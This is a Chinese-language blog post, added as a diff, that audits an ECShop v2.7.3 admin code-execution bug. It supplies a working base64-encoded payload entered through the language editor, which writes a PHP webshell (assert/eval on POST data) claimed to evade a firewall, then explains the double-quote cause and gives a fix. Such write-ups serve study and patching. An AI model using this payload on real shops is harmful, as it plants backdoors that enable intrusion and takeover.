@@ -1,0 +1,179 @@
+---
+author: ww
+comments: true
+date: 2016-01-15 06:48:05+00:00
+layout: post
+link: http://www.gl6.cc/blog/%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1%e3%80%80ecshop-v2-7-3%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9egetshell%e5%88%86%e6%9e%90.html
+slug: '%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1%e3%80%80ecshop-v2-7-3%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9egetshell%e5%88%86%e6%9e%90'
+title: '[代码审计]　ECSHOP v2.7.3后台代码执行漏洞getshell分析'
+wordpress_id: 433
+categories:
+- ECShop
+tags:
+- ecshop
+- php
+- 代码审计
+---
+
+###### 原文地址：http://www.joychou.org/index.php/web/Ecshop-v2-7-3-CodeExecute.html
+
+
+
+
+## 目录：
+
+
+
+
+
+	
+  1. 测试版本
+
+	
+  2. 漏洞条件
+
+	
+  3. 漏洞利用
+
+	
+  4. 漏洞产生原因
+
+	
+  5. 漏洞修复
+
+
+
+
+#### 0x01. 测试版本
+
+
+v2.7.3 RELEASE 20121106（最新）
+v2.7.3 RELEASE 20120411
+
+
+#### 0x02. 漏洞条件
+
+
+需登录到后台
+
+
+#### 0x03. 漏洞利用
+
+
+1.登陆到台后，选择模板管理，语言项编辑，搜索“用户信息”
+
+![4](http://joychou.org/usr/uploads/2014/11/3548980446.jpg)
+
+为什么要搜索“用户信息”，还可以搜索其它的吗？
+
+答案是搜索`languages\zh_cn\user.php`文件里任何一个变量都可以
+
+![1](http://joychou.org/usr/uploads/2014/11/2117672983.jpg)
+
+2.添加如下后门，将用户信息改为
+
+`用户信息${${fputs(fopen(base64_decode(Sm95Q2hvdS5waHA),w),base64_decode(PD9waHAKYXNzZXJ0KAokX1BPU1RbeF0KKTsKPz4))}}`
+
+即生成一个JoyChou.php文件，内容为（可以过安全狗的一句话哦）：
+
+    
+    <code class="language-php"><span class="preprocessor"><?php</span>
+    assert(
+    <span class="variable">$_POST</span>[x]
+    );
+    <span class="preprocessor">?></span>
+    </code>
+
+
+![2](http://joychou.org/usr/uploads/2014/11/3677836906.jpg)
+
+3.访问user.php即可产生shell（不用注册登录账户）
+
+http://localhost/ECShop_V2.7.3_UTF8_release0411/user.php
+或
+http://localhost/ECShop_V2.7.3_UTF8_release0411/languages/zh_cn/user.php
+![3](http://joychou.org/usr/uploads/2014/11/851798454.jpg)
+
+
+#### 0x04. 漏洞产生原因
+
+
+在admin\edit_languages.php文件中第120行，修改变量内容，注意是用的双引号。
+
+    
+    <code class="language-php">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> < count(<span class="variable">$_POST</span>[<span class="string">'item_id'</span>]); <span class="variable">$i</span>++)
+        {
+            <span class="comment">/* 语言项内容如果为空，不修改 */</span>
+            <span class="keyword">if</span> (trim(<span class="variable">$_POST</span>[<span class="string">'item_content'</span>][<span class="variable">$i</span>]) == <span class="string">''</span>)
+            {
+                <span class="keyword">unset</span>(<span class="variable">$src_items</span>[<span class="variable">$i</span>]);
+            }
+            <span class="keyword">else</span>
+            {
+                <span class="variable">$_POST</span>[<span class="string">'item_content'</span>][<span class="variable">$i</span>] = str_replace(<span class="string">'\\\\n'</span>, <span class="string">'\\n'</span>, <span class="variable">$_POST</span>[<span class="string">'item_content'</span>][<span class="variable">$i</span>]);
+                <span class="comment">/* $_POST['item_content'][$i]是修改后增加的内容，即增加的"用户信息${${fputs(fopen"等内容
+                   $dst_items[$i] 是 $_LANG['label_profile'] = "用户信息${${fputs(fopen"; 
+                */</span>
+                <span class="variable">$dst_items</span>[<span class="variable">$i</span>] = <span class="variable">$_POST</span>[<span class="string">'item_id'</span>][<span class="variable">$i</span>] .<span class="string">' = '</span>. <span class="string">'"'</span> .<span class="variable">$_POST</span>[<span class="string">'item_content'</span>][<span class="variable">$i</span>]. <span class="string">'";'</span>;
+            }
+        }
+    </code>
+
+
+修改完后文件\languages\zh_cn\user.php变量为：注意是双引号哦
+
+    
+    <code class="perl"><span class="variable">$_LANG</span>[<span class="string">'label_profile'</span>] = <span class="string">"用户信息<span class="subst">${${fputs(fopen(base64_decode(Sm95Q2hvdS5waHA),w),base64_decode(PD9waHAKYXNzZXJ0KAokX1BPU1RbeF0KKTsKPz4))}</span>}"</span>;
+    </code>
+
+
+![5](http://joychou.org/usr/uploads/2014/11/1868971022.jpg)
+
+由于是双引号，所以只要在任意的php文件中引用这个变量，代码就会成功执行。
+
+至于为什么可以执行？原理如下：
+
+下面这三句话都可以执行，与其说代码执行，不如说参数执行。
+
+    
+    <code class="language-php"><span class="preprocessor"><?php</span> 
+    <span class="variable">$a</span> = <span class="string">"${ phpinfo()}"</span>;  <span class="comment">// 有一个空格</span>
+    <span class="variable">$b</span> = <span class="string">"{${phpinfo()}}"</span>; <span class="comment">// 多一对{}，但是没有空格</span>
+    <span class="variable">$c</span> = <span class="string">"{${fputs(fopen("</span>JoyChou.php<span class="string">", "</span>w+<span class="string">"), "</span><span class="preprocessor"><?php</span> <span class="keyword">eval</span>(\<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="preprocessor">?></span><span class="string">")}}"</span>;
+    <span class="variable">$d</span> = <span class="string">"asdf{${phpinfo()}}"</span>; <span class="comment">// {字符前可以随意加字符串</span>
+    <span class="preprocessor">?></span>
+    </code>
+
+
+而http://localhost/ECShop_V2.7.3_UTF8_release0411/user.php这个文件包含\languages\zh_cn\user.php 这个文件，所以也可以代码执行。
+
+    
+    <code class="language-php"><span class="comment">/* 载入语言文件 */</span>
+    <span class="keyword">require_once</span>(ROOT_PATH . <span class="string">'languages/'</span> .<span class="variable">$_CFG</span>[<span class="string">'lang'</span>]. <span class="string">'/user.php'</span>);
+    </code>
+
+
+
+
+#### 0x05. 漏洞修复
+
+
+了解了漏洞原理后，修复就是一件比较简单的事情，只需将双引号改为单引号
+
+修改\admin\edit_languages.php
+
+    
+    <code class="language-php"><span class="comment">// 修复前</span>
+    <span class="variable">$dst_items</span>[<span class="variable">$i</span>] = <span class="variable">$_POST</span>[<span class="string">'item_id'</span>][<span class="variable">$i</span>] .<span class="string">' = '</span>. <span class="string">'"'</span> .<span class="variable">$_POST</span>[<span class="string">'item_content'</span>][<span class="variable">$i</span>]. <span class="string">'";'</span>;  
+    <span class="comment">// 修复后，由于想在单引号之间出现单引号，必须使用转义。</span>
+    <span class="variable">$dst_items</span>[<span class="variable">$i</span>] = <span class="variable">$_POST</span>[<span class="string">'item_id'</span>][<span class="variable">$i</span>] .<span class="string">' = '</span>. <span class="string">'\''</span> .<span class="variable">$_POST</span>[<span class="string">'item_content'</span>][<span class="variable">$i</span>]. <span class="string">'\';'</span>;
+    </code>
+
+
+修复后，测试一下，是否还有漏洞。
+
+再次修改“用户信息”内容为之前修改的内容。打开\languages\zh_cn\user.php可以看到变量已经变为了单引号
+
+![5](http://joychou.org/usr/uploads/2014/11/2668622542.jpg)
+
+再次访问http://localhost/ECShop_V2.7.3_UTF8_release0411/user.php已经不能生成JoyChou.php，代码没能得到执行。
